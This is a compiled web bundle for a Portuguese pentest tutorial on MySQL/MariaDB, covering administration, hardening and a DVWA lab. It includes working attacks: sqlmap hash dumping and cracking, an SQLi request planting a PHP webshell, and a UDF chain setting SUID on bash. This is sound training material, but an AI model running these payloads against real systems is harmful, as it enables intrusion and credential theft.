import{j as e}from"./index-Bd5otbF3.js";import{P as t}from"./PageContainer-BFcnvssG.js";import{A as r}from"./AlertBox-CL6YULjX.js";import{C as s}from"./CodeBlock-C2J-D4l6.js";import{C as a}from"./CommandTable-BxJEHhQ9.js";import{T as o,P as i}from"./PracticeBox-Pst8IaIf.js";function p(){return e.jsxs(t,{title:"MySQL / MariaDB",subtitle:"Cliente, dump, criação de usuários e — em pentest — enumeração, dump de hashes e RCE via UDF.",difficulty:"intermediario",timeToRead:"18 min",children:[e.jsx("h2",{children:"Por que MySQL importa pro pentester"}),e.jsxs("p",{children:[e.jsx("strong",{children:"MySQL/MariaDB"})," ainda é o backend mais comum em apps PHP, WordPress, Joomla, painéis admin caseiros e DVWA. Como atacante você vai (1) achar credenciais reusadas, (2) abusar de SQL injection que termina em ",e.jsx("code",{children:"UNION SELECT"})," contra ",e.jsx("code",{children:"mysql.user"}),", ou (3) ganhar shell via ",e.jsx("code",{children:"SELECT ... INTO OUTFILE"})," ou ",e.jsx("strong",{children:"UDF"}),". Como administrador você precisa saber subir o serviço, criar usuários com escopo certo e fazer dump/restore."]}),e.jsx("h2",{children:"Instalar e subir no Kali"}),e.jsx(o,{path:"~",lines:[{comment:"no Kali o pacote default é mariadb (fork drop-in)",cmd:"sudo apt install -y mariadb-server mariadb-client",out:`Setting up mariadb-server (1:11.4.4-1) ...
Created symlink /etc/systemd/system/multi-user.target.wants/mariadb.service → /usr/lib/systemd/system/mariadb.service.`,outType:"success"},{cmd:"sudo systemctl enable --now mariadb",out:"(silencioso)",outType:"muted"},{cmd:"sudo systemctl status mariadb --no-pager | head -5",out:`● mariadb.service - MariaDB 11.4.4 database server
     Loaded: loaded (/usr/lib/systemd/system/mariadb.service; enabled)
     Active: active (running) since Sat 2026-04-04 10:21:14 -03; 3s ago
       Docs: man:mariadbd(8)`,outType:"info"},{comment:"hardening básico: roda interativo e responde Y a tudo",cmd:"sudo mariadb-secure-installation",out:`Set root password? [Y/n]
Remove anonymous users? [Y/n]
Disallow root login remotely? [Y/n]
Remove test database and access to it? [Y/n]
Reload privilege tables now? [Y/n]
... Success!`,outType:"warning"}]}),e.jsx("h2",{children:"Cliente — comandos do dia a dia"}),e.jsx(a,{title:"mysql / mariadb client",variations:[{cmd:"sudo mariadb",desc:"Conecta como root via socket Unix (sem senha em Debian/Kali padrão).",output:"MariaDB [(none)]>"},{cmd:"mysql -u root -p",desc:"Conecta via TCP pedindo senha.",output:"Enter password:"},{cmd:"mysql -h 10.10.10.50 -u admin -p'P@ss' app_db",desc:"Conecta em host remoto, db específico.",output:"Welcome to the MariaDB monitor."},{cmd:"mysql -e 'SHOW DATABASES;'",desc:"Roda comando one-shot e sai.",output:"information_schema\\nmysql\\nperformance_schema\\nwordpress"},{cmd:"SHOW DATABASES;",desc:"Lista todos os bancos visíveis ao usuário.",output:"+--------------------+\\n| Database           |\\n+--------------------+"},{cmd:"USE app_db;",desc:"Seleciona o banco corrente.",output:"Database changed"},{cmd:"SHOW TABLES;",desc:"Lista tabelas do banco atual.",output:"users, posts, sessions, ..."},{cmd:"DESCRIBE users;",desc:"Mostra colunas e tipos.",output:"id int, email varchar(255), password_hash varchar(255), is_admin tinyint"},{cmd:"SELECT user, host FROM mysql.user;",desc:"Lista contas do servidor (precisa privilégio).",output:"root@localhost, app@%, dbadmin@10.10.10.%"},{cmd:"STATUS",desc:"Versão, charset, uptime, conexão atual.",output:"Server version: 11.4.4-MariaDB"},{cmd:"\\q",desc:"Sai do prompt.",output:"Bye"}]}),e.jsx("h2",{children:"Criar usuário e dar permissão"}),e.jsx(s,{language:"sql",title:"setup mínimo de um app",code:`-- cria DB
CREATE DATABASE app_db CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;

-- cria usuário só pra esse DB, só de localhost
CREATE USER 'app'@'localhost' IDENTIFIED BY 'TrocarSenhaForte#2026';

-- dá permissões granulares (NUNCA GRANT ALL em prod)
GRANT SELECT, INSERT, UPDATE, DELETE ON app_db.* TO 'app'@'localhost';

-- aplica imediatamente
FLUSH PRIVILEGES;

-- ver o que esse usuário pode fazer
SHOW GRANTS FOR 'app'@'localhost';`}),e.jsx(o,{path:"~",lines:[{cmd:"sudo mariadb < setup.sql",out:"(silencioso = sucesso)",outType:"muted"},{cmd:"mysql -u app -p'TrocarSenhaForte#2026' app_db -e 'SHOW TABLES;'",out:"Empty set (0.001 sec)",outType:"info"}]}),e.jsx("h2",{children:"Dump e restore"}),e.jsx(a,{title:"mysqldump / mariadb-dump",variations:[{cmd:"mysqldump -u root -p app_db > app.sql",desc:"Dump de um banco inteiro.",output:"Cria arquivo SQL com CREATE TABLE + INSERTs."},{cmd:"mysqldump -u root -p --all-databases > full.sql",desc:"Dump de TUDO (inclui mysql.user, com hashes).",output:"ENORME — útil em pentest pós-exploit."},{cmd:"mysqldump -u root -p --no-data app_db > schema.sql",desc:"Só schema, sem dados.",output:"Para clonar estrutura."},{cmd:"mysqldump -h 10.10.10.50 -u dba -p prod_db | gzip > prod.sql.gz",desc:"Compactado já no pipe — exfil eficiente.",output:"Reduz 70-90% o tamanho."},{cmd:"mysql -u root -p app_db < app.sql",desc:"Restaura.",output:"(silencioso)"},{cmd:"mysqldump --single-transaction --quick app_db",desc:"Consistente em InnoDB sem travar tabelas.",output:"Prod-safe."}]}),e.jsx("h2",{children:"━━━ Ataque: enumeração com SQLi ━━━"}),e.jsxs("p",{children:["Quando uma app PHP tem SQL injection, o objetivo final é quase sempre dumpar",e.jsx("code",{children:"mysql.user"})," ou ler arquivos do FS. ",e.jsx("code",{children:"information_schema"}),"é seu mapa do tesouro."]}),e.jsx(o,{path:"~",lines:[{comment:"via sqlmap — ataque automatizado",cmd:"sqlmap -u 'http://target/item.php?id=1' --dbs --batch",out:`[INFO] testing connection to the target URL
[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVING clause' injectable
available databases [4]:
[*] app_db
[*] information_schema
[*] mysql
[*] performance_schema`,outType:"success"},{cmd:"sqlmap -u 'http://target/item.php?id=1' -D mysql -T user --dump --batch",out:`Database: mysql
Table: user
[3 entries]
+-----------+-----------------------------------------------+
| User      | authentication_string                         |
+-----------+-----------------------------------------------+
| root      | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B     |
| app       | *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19     |
| dbadmin   | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9     |
+-----------+-----------------------------------------------+`,outType:"warning"},{comment:"hashes mysql_native_password ($A$ ou * formato) — modo hashcat 300",cmd:"echo '*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B' > mysql_hash.txt",out:"(silencioso)",outType:"muted"},{cmd:"hashcat -m 300 mysql_hash.txt /usr/share/wordlists/rockyou.txt",out:`Hashmode: 300 (MySQL4.1/MySQL5)
*81f5e21e35407d884a6cd4a731aebfb6af209e1b:Welcome2024!
Recovered........: 1/1 (100.00%) Digests`,outType:"success"}]}),e.jsx("h2",{children:"━━━ Ataque: SELECT INTO OUTFILE → webshell ━━━"}),e.jsxs("p",{children:["Se o usuário do MySQL tem ",e.jsx("code",{children:"FILE"})," privilege e ",e.jsx("code",{children:"secure_file_priv"}),"está vazio (ou aponta pra DocumentRoot), você consegue escrever um ",e.jsx("strong",{children:"webshell"}),"direto no servidor."]}),e.jsx(o,{path:"~",lines:[{comment:"checar se o ambiente permite",cmd:`mysql -u app -p -e "SHOW VARIABLES LIKE 'secure_file_priv';"`,out:`+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+`,outType:"warning"},{comment:"via SQLi: dropa um shell PHP no DocumentRoot",cmd:"curl 'http://target/item.php?id=1%20UNION%20SELECT%20%22%3C%3Fphp%20system(%24_GET%5B0%5D)%3B%3F%3E%22%20INTO%20OUTFILE%20%22%2Fvar%2Fwww%2Fhtml%2Fsh.php%22'",out:"(204 ou 500 — não importa, o arquivo foi escrito)",outType:"muted"},{cmd:"curl 'http://target/sh.php?0=id'",out:"uid=33(www-data) gid=33(www-data) groups=33(www-data)",outType:"error"}]}),e.jsx("h2",{children:"━━━ Ataque: UDF para RCE como root do MySQL ━━━"}),e.jsxs("p",{children:["Se você cair em um MariaDB rodando como ",e.jsx("code",{children:"root"})," e tiver ",e.jsx("code",{children:"FILE"})," +",e.jsx("code",{children:"INSERT"})," em ",e.jsx("code",{children:"mysql.func"}),", é possível subir uma ",e.jsx("strong",{children:"User-Defined Function"}),"com ",e.jsx("code",{children:"sys_exec()"}),". ",e.jsx("strong",{children:"raptor_udf2.so"})," é o clássico."]}),e.jsx(s,{language:"sql",title:"UDF chain (clássico raptor)",code:`-- 1) joga o .so em /usr/lib/mysql/plugin/ via OUTFILE
SELECT 0x7f454c46... INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';

-- 2) registra a função
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'raptor_udf2.so';

-- 3) RCE com privilégios do mysqld
SELECT sys_exec('chmod +s /bin/bash');`}),e.jsx(r,{type:"danger",title:"MySQL rodando como root é jackpot",children:e.jsxs("p",{children:["Em distros antigas e em setups DIY o ",e.jsx("code",{children:"mysqld"})," ainda roda como root. Se você ganha credenciais admin do MySQL nesse cenário, UDF = root no host. Sempre rode como o usuário ",e.jsx("code",{children:"mysql"})," dedicado em produção."]})}),e.jsx("h2",{children:"━━━ Defesa: hardening rápido ━━━"}),e.jsx(s,{language:"ini",title:"/etc/mysql/mariadb.conf.d/99-hardening.cnf",code:`[mysqld]
# nunca expor pra rede em produção sem necessidade
bind-address = 127.0.0.1

# bloqueia LOAD DATA / OUTFILE em paths arbitrários
secure_file_priv = /var/lib/mysql-files/

# desabilita LOCAL INFILE (mitiga roubo de arquivos do CLIENTE)
local_infile = 0

# log de queries lentas — útil pra detectar enum maluco
slow_query_log = 1
slow_query_log_file = /var/log/mysql/slow.log
long_query_time = 2

# obrigar TLS em conexões remotas
require_secure_transport = ON`}),e.jsx(a,{title:"checklist defensivo",variations:[{cmd:"DROP USER ''@'localhost';",desc:"Remove usuário anônimo (mariadb-secure-installation já faz).",output:"Query OK"},{cmd:"REVOKE FILE ON *.* FROM 'app'@'localhost';",desc:"Tira privilégio de escrever arquivo.",output:"Bloqueia OUTFILE."},{cmd:"ALTER USER 'app'@'localhost' REQUIRE SSL;",desc:"Força TLS pra esse user.",output:"Conexão sem TLS é rejeitada."},{cmd:"SET GLOBAL log_bin_trust_function_creators = 0;",desc:"Restringe criação de funções por usuários sem SUPER.",output:"Mitiga UDF abuse."}]}),e.jsx(i,{title:"Setup vulnerável → SQLi → dump de hashes",goal:"Subir um MariaDB em Docker com app PHP vulnerável, rodar sqlmap e crackear o hash extraído.",steps:["Suba DVWA via Docker (já tem MySQL embutido).","Login como admin/password, ative SQL Injection (Low).","Capture a URL de exploit no Burp (ex: vulnerabilities/sqli/?id=1).","Rode sqlmap apontando o cookie de sessão.","Dumpe a tabela users do dvwa, depois mysql.user.","Cracke o hash com hashcat -m 300."],command:`docker run --rm -d -p 8080:80 vulnerables/web-dvwa
# (setup inicial em http://localhost:8080)

sqlmap -u 'http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit' \\
  --cookie='PHPSESSID=abc; security=low' \\
  -D dvwa -T users --dump --batch`,expected:`Database: dvwa
Table: users
[5 entries]
+---------+-----------+----------------------------------+
| user    | first_name| password                         |
+---------+-----------+----------------------------------+
| admin   | admin     | 5f4dcc3b5aa765d61d8327deb882cf99 |  <-- "password" (md5)
| gordonb | Gordon    | e99a18c428cb38d5f260853678922e03 |
+---------+-----------+----------------------------------+`,verify:"Hash MD5 5f4dcc3b... bate com 'password'. O fluxo completo SQLi → dump → crack está validado."}),e.jsx(r,{type:"warning",title:"Antes de tocar em qualquer banco",children:e.jsxs("p",{children:["Tudo aqui é exclusivo para ",e.jsx("strong",{children:"laboratórios próprios"}),", máquinas HTB/THM, ou alvos com autorização escrita. Dumpar ",e.jsx("code",{children:"mysql.user"})," sem permissão é crime no Brasil (Lei 12.737 — Carolina Dieckmann) e no resto do mundo (CFAA, GDPR, etc)."]})})]})}export{p as default};
